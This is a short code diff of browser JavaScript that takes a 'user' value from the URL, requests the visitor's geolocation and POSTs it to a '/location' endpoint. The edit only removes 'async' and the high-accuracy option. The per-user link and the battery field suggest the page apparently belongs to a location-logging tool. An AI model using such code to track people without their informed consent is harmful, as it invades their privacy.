@@ -16,7 +16,7 @@ const user = params.get("user")
 
 function getLocation(){
 
-navigator.geolocation.getCurrentPosition(async function(pos){
+navigator.geolocation.getCurrentPosition(function(pos){
 
 fetch("/location",{
 method:"POST",
@@ -31,8 +31,6 @@ battery:"Unknown"
 })
 })
 
-},{
-enableHighAccuracy:true
 })
 
 }
